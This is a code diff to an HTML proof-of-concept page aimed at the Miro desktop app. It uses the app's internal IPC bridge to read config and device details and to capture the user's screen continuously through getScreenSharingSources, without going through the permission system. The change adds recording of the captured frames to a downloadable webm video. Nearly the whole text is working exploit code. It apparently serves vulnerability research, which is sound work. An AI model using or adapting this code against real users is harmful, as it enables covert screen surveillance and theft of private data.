@@ -13,10 +13,12 @@ h1 { color: #e94560; font-size: 18px; }
 #log { white-space: pre-wrap; font-size: 11px; max-height: 200px; overflow-y: auto; }
 .thumb-grid { display: flex; flex-wrap: wrap; gap: 6px; margin-top: 8px; }
 .thumb-grid img { width: 160px; border: 1px solid #333; }
+a.dl { color: #0f0; font-weight: bold; display: inline-block; margin-top: 8px; padding: 6px 14px; border: 1px solid #0f0; text-decoration: none; }
+a.dl:hover { background: #0f03; }
 </style>
 </head>
 <body>
-<h1>Miro Desktop PoC — Continuous Screen Capture v3</h1>
+<h1>Miro Desktop PoC — Continuous Screen Capture v4</h1>
 
 <div class="section">
 <span class="label">Bridge</span>
@@ -27,6 +29,7 @@ h1 { color: #e94560; font-size: 18px; }
 <span class="label">Live Capture — <span id="frame-count">0</span> frames</span>
 <div id="rec-status"></div>
 <canvas id="preview" width="800" height="600"></canvas>
+<div id="download"></div>
 </div>
 
 <div class="section">
@@ -40,12 +43,6 @@ h1 { color: #e94560; font-size: 18px; }
 </div>
 
 <script>
-/*
-  MINIMAL version — ONLY uses getScreenSharingSources() in a loop.
-  No getDisplayMedia, no getMediaAccessStatus, nothing that touches
-  the web permission system. Pure IPC bridge calls only.
-*/
-
 var CAPTURE_INTERVAL_MS = 500;
 var CAPTURE_DURATION_S = 30;
 var KEYFRAME_EVERY = 10;
@@ -65,15 +62,12 @@ function show(id, cls, html) {
 }
 
 (async function() {
-    // Bridge check
     if (typeof _rtb_app_actions_ === 'undefined') {
         show('bridge', 'err', '_rtb_app_actions_ NOT found — not in Miro webview');
         return;
     }
     show('bridge', 'ok', '_rtb_app_actions_ ACCESSIBLE — ' + Object.keys(_rtb_app_actions_).join(', '));
-    log('Bridge found');
 
-    // Steal config + device info (sync IPC, no permission needed)
     try {
         var config = _rtb_app_actions_.getAppConfig();
         show('bridge', 'ok', 'Config: ' + esc(JSON.stringify(config)));
@@ -83,20 +77,56 @@ function show(id, cls, html) {
         show('bridge', 'ok', 'Device: ' + esc(JSON.stringify(info)));
     } catch(e) {}
 
-    // Continuous capture via getScreenSharingSources ONLY
+    // Setup canvas + MediaRecorder to save as video
     var canvas = document.getElementById('preview');
     var ctx = canvas.getContext('2d');
     var frameCount = 0;
     var startTime = Date.now();
     var endTime = startTime + (CAPTURE_DURATION_S * 1000);
 
+    // Record the canvas as a webm video
+    var canvasStream = canvas.captureStream(0); // 0 = manual frame push
+    var recorder = null;
+    var videoChunks = [];
+    var mimeType = 'video/webm';
+
+    if (typeof MediaRecorder !== 'undefined') {
+        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+            mimeType = 'video/webm;codecs=vp9';
+        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+            mimeType = 'video/webm;codecs=vp8';
+        }
+        recorder = new MediaRecorder(canvasStream, { mimeType: mimeType, videoBitsPerSecond: 2000000 });
+        recorder.ondataavailable = function(e) {
+            if (e.data && e.data.size > 0) videoChunks.push(e.data);
+        };
+        recorder.onstop = function() {
+            var blob = new Blob(videoChunks, { type: mimeType });
+            var url = URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'miro_screen_capture_' + new Date().toISOString().slice(0,19).replace(/:/g,'-') + '.webm';
+            a.className = 'dl';
+            a.textContent = 'DOWNLOAD VIDEO (' + (blob.size / 1024 / 1024).toFixed(1) + ' MB, ' + frameCount + ' frames)';
+            document.getElementById('download').appendChild(a);
+            log('Video ready: ' + blob.size + ' bytes');
+            show('rec-status', 'ok', '<b>VIDEO SAVED — click download link above</b>');
+        };
+        recorder.start(1000); // chunk every 1s
+        log('MediaRecorder started: ' + mimeType);
+    }
+
     show('rec-status', 'ok', 'RECORDING — ' + CAPTURE_DURATION_S + 's @ ~' + (1000/CAPTURE_INTERVAL_MS) + ' fps');
     log('Capture started');
 
     async function captureFrame() {
         if (Date.now() >= endTime) {
+            // Stop recording
+            if (recorder && recorder.state === 'recording') {
+                recorder.stop();
+            }
             show('rec-status', 'ok', '<b>DONE — ' + frameCount + ' frames captured</b>');
-            log('Complete: ' + frameCount + ' frames');
+            log('Complete: ' + frameCount + ' frames in ' + CAPTURE_DURATION_S + 's');
             return;
         }
 
@@ -112,10 +142,14 @@ function show(id, cls, html) {
                 frameCount++;
                 document.getElementById('frame-count').textContent = frameCount;
 
-                // Live preview
+                // Draw to canvas
                 var img = new Image();
                 img.onload = function() {
                     ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                    // Push frame to MediaRecorder
+                    if (canvasStream.getVideoTracks().length > 0) {
+                        try { canvasStream.getVideoTracks()[0].requestFrame(); } catch(e) {}
+                    }
                 };
                 img.src = sources[0].thumbnailUrl;
 
@@ -128,7 +162,7 @@ function show(id, cls, html) {
                 }
 
                 if (frameCount % 10 === 0) {
-                    log('Frame ' + frameCount + ' captured');
+                    log('Frame ' + frameCount);
                 }
             }
         } catch(e) {
